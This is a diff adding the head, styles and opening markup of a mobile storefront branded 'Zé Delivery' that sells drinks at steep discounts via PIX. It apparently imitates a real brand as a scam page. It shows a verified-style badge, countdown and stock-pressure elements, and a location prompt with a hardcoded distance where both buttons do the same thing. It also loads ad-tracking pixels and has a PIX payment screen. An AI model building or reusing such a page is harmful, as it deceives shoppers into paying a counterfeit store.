@@ -1,0 +1,1766 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Zé Delivery — Bebidas Geladas na sua porta!</title>
+  <meta name="description" content="Peça bebidas geladas com entrega rápida. Whisky, Gin, Cerveja, Energéticos e muito mais com até 67% OFF!">
+  <meta name="theme-color" content="#FFCC00">
+
+  <!-- UTMify Pixel -->
+  <script>
+    window.pixelId = "6a3dbedb33798c7e7b9c331d";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+  <!-- Meta Pixel -->
+  <script>
+    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+    n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}
+    (window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '4470220059973229');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=4470220059973229&ev=PageView&noscript=1"/></noscript>
+
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+  <!-- Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <style>
+    /* ─── TOKENS ──────────────────────────────────────────────── */
+    :root {
+      --yellow:     #FFCC00;
+      --yellow-dk:  #E6B800;
+      --yellow-lt:  #FFF8D0;
+      --black:      #0D0D0D;
+      --gray-dk:    #333333;
+      --gray-md:    #6B6B6B;
+      --gray-lt:    #F5F5F5;
+      --border:     #E8E8E8;
+      --green:      #077C22;
+      --green-lt:   #E8F5EC;
+      --red:        #E00;
+      --red-lt:     #FFF0F0;
+      --white:      #FFFFFF;
+      --radius-sm:  8px;
+      --radius-md:  14px;
+      --radius-lg:  20px;
+      --shadow-sm:  0 2px 8px rgba(0,0,0,.08);
+      --shadow-md:  0 6px 24px rgba(0,0,0,.12);
+      --shadow-lg:  0 12px 40px rgba(0,0,0,.18);
+      --font:       'Nunito', sans-serif;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { font-size: 16px; scroll-behavior: smooth; }
+    body {
+      font-family: var(--font);
+      background: var(--gray-lt);
+      color: var(--black);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    img { display: block; max-width: 100%; }
+    button { cursor: pointer; border: none; background: none; font-family: inherit; }
+    a { text-decoration: none; color: inherit; }
+
+    .page {
+      max-width: 640px;
+      margin: 0 auto;
+      background: var(--white);
+      min-height: 100vh;
+      position: relative;
+    }
+
+    /* ─── BANNER TOPO ─────────────────────────────────────────── */
+    .banner-promo {
+      background: var(--black);
+      color: var(--yellow);
+      text-align: center;
+      padding: 8px 16px;
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: .4px;
+    }
+    .banner-promo span { color: var(--white); font-weight: 600; }
+
+    /* ─── HEADER ──────────────────────────────────────────────── */
+    .store-header { background: var(--white); position: relative; }
+    .cover-img { width: 100%; height: 140px; background: #1a1a1a; position: relative; }
+    .cover-img img { width: 100%; height: 100%; object-fit: cover; }
+
+    .logo-wrap {
+      position: absolute;
+      left: 50%; transform: translateX(-50%);
+      bottom: -36px; z-index: 10;
+      width: 80px; height: 80px;
+      border-radius: 50%;
+      border: 4px solid var(--white);
+      background: var(--yellow);
+      box-shadow: var(--shadow-md);
+      display: flex; align-items: center; justify-content: center;
+      overflow: hidden;
+    }
+    .logo-wrap img { width: 100%; height: 100%; object-fit: contain; border-radius: 50%; }
+
+    .store-info-card {
+      margin: 0 12px;
+      margin-top: 48px;
+      background: var(--white);
+      border-radius: var(--radius-lg);
+      padding: 16px 20px 14px;
+      box-shadow: var(--shadow-md);
+    }
+    .store-name {
+      font-size: 22px; font-weight: 900; color: var(--black);
+      display: flex; align-items: center; gap: 6px; justify-content: center;
+    }
+    .store-name .verified { color: #1877F2; font-size: 16px; }
+    .store-rating {
+      display: flex; align-items: center; justify-content: center;
+      gap: 6px; margin-top: 4px; font-size: 13px; color: var(--gray-dk);
+    }
+    .store-rating .stars { color: #F5A623; }
+    .store-rating .count { color: var(--gray-md); }
+    .store-divider { height: 1px; background: var(--border); margin: 10px 0; }
+    .store-meta {
+      display: flex; align-items: center; justify-content: center;
+      flex-wrap: wrap; gap: 10px; font-size: 12px; color: var(--gray-md);
+    }
+    .store-meta .pill {
+      display: flex; align-items: center; gap: 4px;
+      background: var(--gray-lt); padding: 4px 10px;
+      border-radius: 20px; font-weight: 700;
+    }
+    .store-meta .pill.green { background: var(--green-lt); color: var(--green); }
+    .store-meta .pill.yellow { background: var(--yellow-lt); color: #8B6900; }
+    .store-meta .pill i { font-size: 11px; }
+    .store-status-row {
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      margin-top: 8px; font-size: 12px; font-weight: 800; color: var(--green);
+    }
+    .dot-pulse {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: var(--green);
+      animation: pulse 1.4s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(7,124,34,.5); }
+      50%       { box-shadow: 0 0 0 5px rgba(7,124,34,0); }
+    }
+
+    .partner-badge {
+      margin: 10px 12px 0;
+      background: var(--yellow-lt);
+      border: 1.5px solid var(--yellow);
+      border-radius: var(--radius-md);
+      padding: 10px 14px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .partner-badge .badge-icon {
+      width: 40px; height: 40px; background: var(--yellow);
+      border-radius: 10px; display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; font-size: 20px;
+    }
+    .partner-badge .badge-text p:first-child {
+      font-size: 10px; font-weight: 900;
+      text-transform: uppercase; letter-spacing: .5px; color: var(--gray-md);
+    }
+    .partner-badge .badge-text p:last-child { font-size: 12px; font-weight: 700; color: var(--black); }
+
+    /* ─── COUNTDOWN ───────────────────────────────────────────── */
+    .countdown-bar {
+      margin: 10px 12px 0;
+      background: var(--black);
+      border-radius: var(--radius-md);
+      padding: 10px 16px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .countdown-bar .cd-label { font-size: 11px; font-weight: 800; color: rgba(255,255,255,.7); text-transform: uppercase; letter-spacing: .5px; }
+    .countdown-bar .cd-label span { display: block; color: var(--yellow); font-size: 13px; }
+    .countdown-digits { display: flex; align-items: center; gap: 4px; }
+    .cd-box {
+      background: var(--yellow); color: var(--black);
+      border-radius: 6px; padding: 4px 8px;
+      font-size: 18px; font-weight: 900; line-height: 1; min-width: 36px; text-align: center;
+    }
+    .cd-sep { color: var(--yellow); font-size: 16px; font-weight: 900; }
+    .cd-unit { font-size: 9px; font-weight: 700; color: rgba(255,255,255,.5); text-align: center; margin-top: 2px; }
+
+    /* ─── STICKY CATEGORIAS ───────────────────────────────────── */
+    .cat-nav { position: sticky; top: 0; z-index: 50; background: var(--white); border-bottom: 1.5px solid var(--border); }
+    .cat-nav-inner { display: flex; gap: 0; overflow-x: auto; scrollbar-width: none; padding: 0 12px; }
+    .cat-nav-inner::-webkit-scrollbar { display: none; }
+    .cat-btn { flex-shrink: 0; padding: 12px 14px; font-size: 13px; font-weight: 700; color: var(--gray-md); border-bottom: 2.5px solid transparent; white-space: nowrap; transition: color .2s, border-color .2s; }
+    .cat-btn.active { color: var(--black); border-bottom-color: var(--yellow); }
+
+    /* ─── PRODUTO SECTION ─────────────────────────────────────── */
+    .section { padding: 16px 0 4px; }
+    .section + .section { border-top: 6px solid var(--gray-lt); }
+    .section-head { padding: 0 16px 10px; }
+    .section-head h2 { font-size: 16px; font-weight: 800; color: var(--black); }
+    .section-head p { font-size: 12px; color: var(--gray-md); margin-top: 2px; }
+
+    /* ─── CARD PRODUTO ────────────────────────────────────────── */
+    .product-list { padding: 0 12px; display: flex; flex-direction: column; gap: 0; }
+    .product-card {
+      display: flex; align-items: flex-start; gap: 12px;
+      padding: 14px 4px; border-bottom: 1px solid var(--border);
+      cursor: pointer; transition: background .15s;
+      border-radius: 10px; position: relative;
+    }
+    .product-card:last-child { border-bottom: none; }
+    .product-card:active { background: var(--gray-lt); }
+    .product-card.flash {
+      border: 2px solid var(--green); border-radius: 12px;
+      padding: 12px; margin-bottom: 4px;
+      background: linear-gradient(135deg, #f0fff4 0%, #fff 100%);
+    }
+    .prod-info { flex: 1; min-width: 0; }
+    .prod-badges { display: flex; gap: 4px; flex-wrap: wrap; margin-bottom: 4px; }
+    .badge { font-size: 9px; font-weight: 900; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; letter-spacing: .3px; }
+    .badge.best   { background: var(--yellow-lt); color: #8B6900; }
+    .badge.flash-b{ background: var(--red); color: var(--white); }
+    .badge.new    { background: #E8F0FE; color: #1a73e8; }
+    .badge.off    { background: var(--green-lt); color: var(--green); }
+    .prod-name { font-size: 14px; font-weight: 700; color: var(--black); line-height: 1.3; margin-bottom: 3px; }
+    .prod-desc { font-size: 12px; color: var(--gray-md); line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+    .prod-prices { display: flex; align-items: center; gap: 6px; margin-top: 6px; flex-wrap: wrap; }
+    .prod-price { font-size: 15px; font-weight: 900; color: var(--black); }
+    .prod-price-old { font-size: 12px; color: var(--gray-md); text-decoration: line-through; }
+    .prod-off-pct { font-size: 10px; font-weight: 900; background: var(--green-lt); color: var(--green); padding: 1px 5px; border-radius: 4px; }
+    .prod-stock { font-size: 10px; font-weight: 700; color: var(--red); margin-top: 4px; }
+    .prod-img-wrap { width: 90px; height: 90px; border-radius: 12px; background: var(--gray-lt); flex-shrink: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+    .prod-img-wrap img { width: 100%; height: 100%; object-fit: cover; }
+    .btn-add-card {
+      position: absolute; right: 0; bottom: 14px;
+      width: 30px; height: 30px; background: var(--yellow);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      font-size: 16px; font-weight: 900; color: var(--black);
+      box-shadow: 0 2px 8px rgba(0,0,0,.15);
+      transition: transform .15s, box-shadow .15s;
+    }
+    .btn-add-card:active { transform: scale(.92); }
+    .qty-inline { display: flex; align-items: center; background: var(--gray-lt); border-radius: 20px; overflow: hidden; border: 1.5px solid var(--border); }
+    .qty-inline button { width: 30px; height: 30px; font-size: 16px; font-weight: 900; color: var(--black); transition: background .15s; }
+    .qty-inline button:active { background: var(--border); }
+    .qty-inline .qty-val { font-size: 14px; font-weight: 900; min-width: 24px; text-align: center; color: var(--black); }
+
+    /* ─── AVALIAÇÕES ──────────────────────────────────────────── */
+    .reviews-section { padding: 16px 12px 12px; background: var(--white); }
+    .reviews-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+    .reviews-score { background: var(--yellow); border-radius: 10px; padding: 8px 12px; text-align: center; }
+    .reviews-score .score-num { font-size: 24px; font-weight: 900; }
+    .reviews-score .score-stars { color: #333; font-size: 10px; }
+    .reviews-meta { flex: 1; }
+    .reviews-meta p { font-size: 13px; font-weight: 700; color: var(--black); }
+    .reviews-meta small { font-size: 11px; color: var(--gray-md); }
+    .review-item { padding: 12px 0; border-bottom: 1px solid var(--border); display: flex; gap: 10px; align-items: flex-start; }
+    .review-item:last-child { border-bottom: none; }
+    .review-avatar { width: 36px; height: 36px; border-radius: 50%; background: var(--gray-lt); display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 800; color: var(--gray-md); flex-shrink: 0; overflow: hidden; }
+    .review-body { flex: 1; }
+    .review-name { font-size: 13px; font-weight: 800; color: var(--black); }
+    .review-stars { color: #F5A623; font-size: 11px; }
+    .review-date { font-size: 10px; color: var(--gray-md); margin-left: 4px; }
+    .review-text { font-size: 12px; color: #444; margin-top: 3px; line-height: 1.5; }
+    .review-img { width: 56px; height: 56px; border-radius: 8px; object-fit: cover; flex-shrink: 0; }
+
+    /* ─── FOOTER INFO ─────────────────────────────────────────── */
+    .footer-info { background: var(--black); color: rgba(255,255,255,.6); padding: 20px 16px; font-size: 11px; text-align: center; line-height: 1.7; }
+    .footer-info strong { color: var(--yellow); }
+
+    /* ─── CART BAR ────────────────────────────────────────────── */
+    .cart-bar { display: none; position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 640px; padding: 10px 16px 16px; background: var(--white); border-top: 1px solid var(--border); z-index: 100; }
+    .cart-bar-btn { width: 100%; background: var(--yellow); color: var(--black); padding: 14px 18px; border-radius: var(--radius-md); display: flex; align-items: center; justify-content: space-between; font-size: 15px; font-weight: 900; box-shadow: 0 4px 16px rgba(255,204,0,.4); }
+    .cart-count-badge { background: var(--black); color: var(--yellow); border-radius: 50%; width: 22px; height: 22px; font-size: 12px; font-weight: 900; display: inline-flex; align-items: center; justify-content: center; margin-right: 8px; }
+    .cb-left { display: flex; align-items: center; }
+    .cb-total { font-size: 16px; font-weight: 900; }
+
+    /* ─── CART DRAWER ─────────────────────────────────────────── */
+    .cart-overlay { position: fixed; inset: 0; background: rgba(0,0,0,.5); z-index: 200; opacity: 0; pointer-events: none; transition: opacity .3s; }
+    .cart-overlay.open { opacity: 1; pointer-events: all; }
+    .cart-drawer { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%) translateY(100%); width: 100%; max-width: 640px; background: var(--white); border-radius: var(--radius-lg) var(--radius-lg) 0 0; z-index: 201; transition: transform .35s cubic-bezier(.32,.72,0,1); max-height: 85vh; display: flex; flex-direction: column; }
+    .cart-drawer.open { transform: translateX(-50%) translateY(0); }
+    .cart-handle { width: 40px; height: 4px; background: var(--border); border-radius: 4px; margin: 10px auto 0; }
+    .cart-drawer-head { padding: 14px 20px 10px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+    .cart-drawer-head h3 { font-size: 18px; font-weight: 900; }
+    .cart-close { width: 32px; height: 32px; border-radius: 50%; background: var(--gray-lt); display: flex; align-items: center; justify-content: center; font-size: 14px; color: var(--gray-dk); }
+    .cart-items { flex: 1; overflow-y: auto; padding: 12px 16px; }
+    .cart-item { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid var(--border); }
+    .cart-item:last-child { border-bottom: none; }
+    .cart-item-img { width: 52px; height: 52px; border-radius: 8px; background: var(--gray-lt); flex-shrink: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; font-size: 22px; opacity: .5; }
+    .cart-item-info { flex: 1; }
+    .cart-item-name { font-size: 13px; font-weight: 700; color: var(--black); }
+    .cart-item-price { font-size: 12px; color: var(--gray-md); margin-top: 2px; }
+    .cart-item-qty { display: flex; align-items: center; gap: 2px; }
+    .cart-item-qty button { width: 28px; height: 28px; border-radius: 50%; background: var(--gray-lt); font-size: 14px; font-weight: 900; color: var(--black); display: flex; align-items: center; justify-content: center; }
+    .cart-item-qty span { min-width: 24px; text-align: center; font-size: 14px; font-weight: 800; }
+    .cart-item-subtotal { font-size: 13px; font-weight: 800; color: var(--black); min-width: 64px; text-align: right; }
+    .cart-empty { text-align: center; padding: 40px 20px; color: var(--gray-md); }
+    .cart-empty i { font-size: 48px; opacity: .2; display: block; margin-bottom: 12px; }
+    .cart-empty p { font-size: 14px; font-weight: 600; }
+    .cart-footer { padding: 14px 16px; border-top: 1px solid var(--border); }
+    .cart-summary { margin-bottom: 12px; }
+    .cart-summary-row { display: flex; justify-content: space-between; font-size: 13px; color: var(--gray-dk); margin-bottom: 4px; }
+    .cart-summary-row.total { font-size: 16px; font-weight: 900; color: var(--black); border-top: 1px solid var(--border); padding-top: 8px; margin-top: 4px; }
+    .btn-checkout { width: 100%; background: var(--yellow); color: var(--black); padding: 15px; border-radius: var(--radius-md); font-size: 16px; font-weight: 900; box-shadow: 0 4px 16px rgba(255,204,0,.4); transition: transform .15s; }
+    .btn-checkout:active { transform: scale(.98); }
+    .min-order-warn { font-size: 11px; color: var(--red); margin-top: 6px; text-align: center; display: none; }
+
+    /* ─── TOAST ───────────────────────────────────────────────── */
+    .toast { position: fixed; bottom: 90px; left: 50%; transform: translateX(-50%) translateY(20px); background: var(--black); color: var(--white); padding: 10px 20px; border-radius: 30px; font-size: 13px; font-weight: 700; z-index: 300; opacity: 0; pointer-events: none; transition: opacity .2s, transform .2s; white-space: nowrap; box-shadow: var(--shadow-md); }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    .toast .t-icon { color: var(--yellow); margin-right: 6px; }
+
+    /* ─── LOCATION MODAL ──────────────────────────────────────── */
+    .loc-overlay { position: fixed; inset: 0; background: rgba(0,0,0,.6); z-index: 400; display: flex; align-items: center; justify-content: center; padding: 20px; }
+    .loc-modal { background: var(--white); border-radius: var(--radius-lg); padding: 28px 24px; width: 100%; max-width: 360px; text-align: center; box-shadow: var(--shadow-lg); animation: pop .3s cubic-bezier(.34,1.56,.64,1); }
+    @keyframes pop { from { transform: scale(.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .loc-modal .loc-icon { font-size: 40px; margin-bottom: 10px; }
+    .loc-modal h2 { font-size: 20px; font-weight: 900; margin-bottom: 6px; }
+    .loc-modal p { font-size: 13px; color: var(--gray-md); margin-bottom: 16px; }
+    .loc-city-box { background: var(--gray-lt); border-radius: 12px; padding: 10px 16px; margin-bottom: 16px; }
+    .loc-city-box strong { font-size: 16px; font-weight: 900; display: block; }
+    .loc-city-box small { font-size: 11px; color: var(--green); font-weight: 700; }
+    .btn-confirm-loc { width: 100%; background: var(--yellow); color: var(--black); padding: 14px; border-radius: var(--radius-md); font-size: 15px; font-weight: 900; margin-bottom: 8px; }
+    .btn-other-loc { width: 100%; background: var(--gray-lt); color: var(--gray-dk); padding: 12px; border-radius: var(--radius-md); font-size: 13px; font-weight: 700; }
+
+    /* ─── CHECKOUT MODAL ──────────────────────────────────────── */
+    .ck-overlay {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,.6);
+      z-index: 500;
+      display: none;
+      align-items: flex-end;
+      justify-content: center;
+    }
+    .ck-overlay.open { display: flex; }
+
+    .ck-modal {
+      background: var(--white);
+      border-radius: var(--radius-lg) var(--radius-lg) 0 0;
+      width: 100%; max-width: 640px;
+      max-height: 95vh;
+      overflow-y: auto;
+      animation: slideUp .35s cubic-bezier(.32,.72,0,1);
+    }
+    @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+    .ck-header {
+      position: sticky; top: 0;
+      background: var(--white);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 20px;
+      display: flex; align-items: center; gap: 12px;
+      z-index: 10;
+    }
+    .ck-header h2 { font-size: 17px; font-weight: 900; flex: 1; }
+    .ck-close { width: 34px; height: 34px; border-radius: 50%; background: var(--gray-lt); display: flex; align-items: center; justify-content: center; font-size: 15px; }
+
+    .ck-body { padding: 20px 20px 32px; }
+
+    /* Trust bar */
+    .ck-trust {
+      display: flex; gap: 8px; justify-content: center;
+      flex-wrap: wrap; margin-bottom: 20px;
+    }
+    .ck-trust-item {
+      display: flex; align-items: center; gap: 5px;
+      font-size: 11px; font-weight: 700; color: var(--gray-dk);
+      background: var(--gray-lt); padding: 5px 10px; border-radius: 20px;
+    }
+    .ck-trust-item i { color: var(--green); font-size: 10px; }
+
+    /* Resumo do pedido */
+    .ck-order-summary {
+      background: var(--yellow-lt);
+      border: 1.5px solid var(--yellow);
+      border-radius: var(--radius-md);
+      padding: 14px 16px;
+      margin-bottom: 20px;
+    }
+    .ck-order-summary .ck-order-title {
+      font-size: 11px; font-weight: 900; text-transform: uppercase;
+      letter-spacing: .5px; color: var(--gray-md); margin-bottom: 8px;
+    }
+    .ck-order-row {
+      display: flex; justify-content: space-between;
+      font-size: 13px; color: var(--gray-dk); margin-bottom: 4px;
+    }
+    .ck-order-total {
+      display: flex; justify-content: space-between;
+      font-size: 16px; font-weight: 900; color: var(--black);
+      border-top: 1px solid var(--yellow-dk); padding-top: 8px; margin-top: 4px;
+    }
+    .ck-order-total .ck-pix-badge {
+      background: var(--green); color: var(--white);
+      font-size: 10px; padding: 2px 7px; border-radius: 4px; margin-left: 6px;
+      font-weight: 800; letter-spacing: .3px; vertical-align: middle;
+    }
+
+    /* Campos do form */
+    .ck-section-label {
+      font-size: 12px; font-weight: 900; text-transform: uppercase;
+      letter-spacing: .5px; color: var(--gray-md);
+      margin-bottom: 10px; margin-top: 20px;
+    }
+    .ck-field {
+      margin-bottom: 12px;
+    }
+    .ck-field label {
+      display: block; font-size: 12px; font-weight: 800; color: var(--gray-dk);
+      margin-bottom: 4px;
+    }
+    .ck-field input {
+      width: 100%; padding: 12px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius-sm);
+      font-size: 14px; font-family: var(--font); font-weight: 600;
+      color: var(--black);
+      outline: none;
+      transition: border-color .2s;
+      background: var(--white);
+    }
+    .ck-field input:focus { border-color: var(--yellow-dk); }
+    .ck-field input.error { border-color: var(--red); }
+    .ck-field input:read-only { background: var(--gray-lt); color: var(--gray-md); }
+    .ck-field .ck-hint { font-size: 11px; color: var(--gray-md); margin-top: 3px; }
+    .ck-row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+    /* CEP loading */
+    .ck-cep-wrap { position: relative; }
+    .ck-cep-spinner {
+      position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+      width: 16px; height: 16px; border: 2px solid var(--border);
+      border-top-color: var(--black); border-radius: 50%;
+      animation: spin .6s linear infinite;
+      display: none;
+    }
+    @keyframes spin { to { transform: translateY(-50%) rotate(360deg); } }
+
+    /* Botão finalizar */
+    .btn-gerar-pix {
+      width: 100%; background: #077C22; color: var(--white);
+      padding: 16px; border-radius: var(--radius-md);
+      font-size: 16px; font-weight: 900;
+      margin-top: 20px;
+      box-shadow: 0 4px 16px rgba(7,124,34,.35);
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      transition: transform .15s, opacity .15s;
+    }
+    .btn-gerar-pix:active { transform: scale(.98); }
+    .btn-gerar-pix:disabled { opacity: .6; pointer-events: none; }
+    .btn-gerar-pix .pix-icon { font-size: 20px; }
+
+    .ck-security-note {
+      text-align: center; margin-top: 10px;
+      font-size: 11px; color: var(--gray-md);
+      display: flex; align-items: center; justify-content: center; gap: 4px;
+    }
+    .ck-security-note i { color: var(--green); }
+
+    /* ─── TELA PIX ────────────────────────────────────────────── */
+    .pix-screen { display: none; }
+    .pix-screen.active { display: block; }
+    .checkout-form-area { }
+    .checkout-form-area.hidden { display: none; }
+
+    .pix-header-banner {
+      background: linear-gradient(135deg, #077C22 0%, #0a9929 100%);
+      border-radius: var(--radius-md);
+      padding: 18px 16px;
+      text-align: center;
+      margin-bottom: 16px;
+      color: var(--white);
+    }
+    .pix-header-banner .pix-logo { font-size: 32px; margin-bottom: 6px; }
+    .pix-header-banner h3 { font-size: 17px; font-weight: 900; margin-bottom: 2px; }
+    .pix-header-banner p { font-size: 12px; opacity: .85; }
+
+    .pix-value-box {
+      background: var(--green-lt);
+      border: 2px solid var(--green);
+      border-radius: var(--radius-md);
+      padding: 14px 16px;
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    .pix-value-box .pv-label { font-size: 11px; font-weight: 800; color: var(--green); text-transform: uppercase; letter-spacing: .5px; }
+    .pix-value-box .pv-amount { font-size: 28px; font-weight: 900; color: var(--black); margin: 2px 0; }
+    .pix-value-box .pv-items { font-size: 11px; color: var(--gray-md); }
+
+    .pix-qr-wrap {
+      display: flex; justify-content: center;
+      margin: 14px 0;
+    }
+    .pix-qr-wrap img {
+      width: 190px; height: 190px;
+      border-radius: 12px;
+      border: 3px solid var(--green);
+      padding: 6px;
+      background: var(--white);
+    }
+    .pix-qr-wrap .pix-qr-placeholder {
+      width: 190px; height: 190px;
+      border-radius: 12px;
+      border: 3px dashed var(--border);
+      display: flex; align-items: center; justify-content: center;
+      flex-direction: column; gap: 8px; color: var(--gray-md);
+      font-size: 13px; font-weight: 700;
+    }
+
+    .pix-copy-box {
+      background: var(--gray-lt);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius-md);
+      padding: 12px 14px;
+      margin-bottom: 12px;
+    }
+    .pix-copy-box .pcb-label { font-size: 10px; font-weight: 800; color: var(--gray-md); text-transform: uppercase; letter-spacing: .5px; margin-bottom: 6px; }
+    .pix-copy-box .pcb-code { font-size: 11px; color: var(--gray-dk); word-break: break-all; line-height: 1.5; font-family: monospace; }
+    .btn-copy-pix {
+      width: 100%; background: var(--black); color: var(--yellow);
+      padding: 14px; border-radius: var(--radius-md);
+      font-size: 15px; font-weight: 900;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      margin-bottom: 10px;
+      transition: transform .15s;
+    }
+    .btn-copy-pix:active { transform: scale(.98); }
+    .btn-copy-pix.copied { background: var(--green); color: var(--white); }
+
+    .pix-expire-bar {
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      font-size: 12px; font-weight: 700; color: var(--gray-md);
+      margin-bottom: 14px;
+    }
+    .pix-expire-bar i { color: var(--red); }
+    .pix-expire-bar #pixExpireMin { color: var(--red); font-weight: 900; }
+
+    /* Trust items no PIX */
+    .pix-trust-row {
+      display: flex; gap: 8px; flex-wrap: wrap; justify-content: center;
+      margin-bottom: 14px;
+    }
+    .pix-trust-item {
+      display: flex; align-items: center; gap: 4px;
+      font-size: 10px; font-weight: 700; color: var(--gray-dk);
+      background: var(--white); border: 1px solid var(--border);
+      padding: 5px 8px; border-radius: 12px;
+    }
+    .pix-trust-item i { color: var(--green); font-size: 9px; }
+
+    /* Waiting status */
+    .pix-status-bar {
+      background: var(--yellow-lt);
+      border: 1.5px solid var(--yellow-dk);
+      border-radius: var(--radius-md);
+      padding: 12px 16px;
+      display: flex; align-items: center; gap: 10px;
+      margin-bottom: 14px;
+    }
+    .pix-status-bar .psb-icon { font-size: 22px; animation: pulse2 1.5s ease-in-out infinite; }
+    @keyframes pulse2 { 0%,100%{transform:scale(1)} 50%{transform:scale(1.15)} }
+    .pix-status-bar .psb-text strong { font-size: 13px; font-weight: 900; display: block; }
+    .pix-status-bar .psb-text span { font-size: 11px; color: var(--gray-md); }
+
+    /* Zé Delivery promo abaixo do PIX */
+    .ze-promo-box {
+      background: var(--black);
+      border-radius: var(--radius-md);
+      padding: 14px 16px;
+      display: flex; align-items: center; gap: 12px;
+      margin-bottom: 14px;
+    }
+    .ze-promo-box .ze-promo-img {
+      width: 44px; height: 44px; border-radius: 10px;
+      background: var(--yellow); display: flex; align-items: center; justify-content: center;
+      font-size: 22px; flex-shrink: 0;
+    }
+    .ze-promo-box .ze-promo-text strong { font-size: 12px; font-weight: 900; color: var(--yellow); display: block; }
+    .ze-promo-box .ze-promo-text span { font-size: 11px; color: rgba(255,255,255,.7); }
+
+    /* ─── TELA SUCESSO ────────────────────────────────────────── */
+    .success-screen {
+      display: none; text-align: center; padding: 30px 20px 40px;
+    }
+    .success-screen.active { display: block; }
+    .success-icon {
+      width: 80px; height: 80px; border-radius: 50%;
+      background: var(--green); margin: 0 auto 16px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 36px; color: var(--white);
+      animation: bounceIn .5s cubic-bezier(.34,1.56,.64,1);
+    }
+    @keyframes bounceIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .success-screen h2 { font-size: 22px; font-weight: 900; color: var(--black); margin-bottom: 8px; }
+    .success-screen p { font-size: 14px; color: var(--gray-md); line-height: 1.6; margin-bottom: 20px; }
+    .success-delivery-card {
+      background: var(--green-lt);
+      border: 2px solid var(--green);
+      border-radius: var(--radius-md);
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+    .success-delivery-card .sdc-row {
+      display: flex; align-items: center; gap: 10px;
+      font-size: 13px; color: var(--gray-dk);
+      padding: 6px 0;
+      border-bottom: 1px solid rgba(7,124,34,.15);
+    }
+    .success-delivery-card .sdc-row:last-child { border-bottom: none; }
+    .success-delivery-card .sdc-row i { color: var(--green); width: 18px; text-align: center; }
+    .success-delivery-card .sdc-row strong { color: var(--black); }
+    .success-ze-banner {
+      background: var(--yellow);
+      border-radius: var(--radius-md);
+      padding: 14px 16px;
+      display: flex; align-items: center; gap: 12px;
+      text-align: left;
+    }
+    .success-ze-banner .szb-emoji { font-size: 28px; }
+    .success-ze-banner p { font-size: 12px; font-weight: 700; color: var(--black); line-height: 1.5; }
+
+    .pb-cart { padding-bottom: 80px; }
+    @media (max-width: 400px) { .store-name { font-size: 19px; } }
+  </style>
+</head>
+<body>
+
+<!-- ── LOCATION MODAL ─────────────────────────────────────────── -->
+<div class="loc-overlay" id="locOverlay">
+  <div class="loc-modal">
+    <h2>Confirme sua localização</h2>
+    <p>Encontramos a loja mais próxima de você!</p>
+    <div class="loc-city-box">
+      <strong id="locCityName">Carregando...</strong>
+      <small>A <b>1,08 km</b> de você • Entrega em 15-45 min</small>
+    </div>
+    <button class="btn-confirm-loc" onclick="confirmLocation()">Sim, confirmar localização</button>
+    <button class="btn-other-loc" onclick="confirmLocation()">Não, escolher outro local</button>
+  </div>
+</div>
+
+<!-- ── TOAST ──────────────────────────────────────────────────── -->
+<div class="toast" id="toast">
+  <span class="t-icon">🍺</span>
+  <span id="toastMsg">Adicionado ao carrinho!</span>
+</div>
+
